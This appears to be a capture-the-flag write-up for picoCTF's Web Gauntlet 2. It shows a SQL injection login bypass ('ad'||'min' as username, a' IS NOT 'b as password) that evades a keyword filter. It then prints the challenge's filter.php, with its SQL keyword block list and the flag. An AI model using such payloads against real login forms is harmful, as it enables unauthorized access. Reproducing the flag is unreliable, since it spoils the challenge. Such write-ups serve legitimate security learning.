# Web Gauntlet 2 → 170 Pts.

1. We land on a website’s login page.

2. We have a filter.php page which says which words are filtered out.

3. We put username=admin password=password but admin is filtered so we can’t put it.

4. Tried appending long passwords but the character limit is <34.

5. But we can see that when we put a random username and password which are under 34 then they were reverting back in the background of the login page.

6. Then we searched the SQLi payloads and studied them.

7. We tried concatenating the Admin word with || like ‘Ad’ || ‘min’ and password as password and we were getting the output in the background.

8. So now the thing remain is the payload and we generated the payload as ad||min as username and password as `a' IS NOT 'b`

9. We get success and then opening _filter.php_ we get:

```
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_b55c7a5682db6cb0192b28772d4f4131}
?>
```

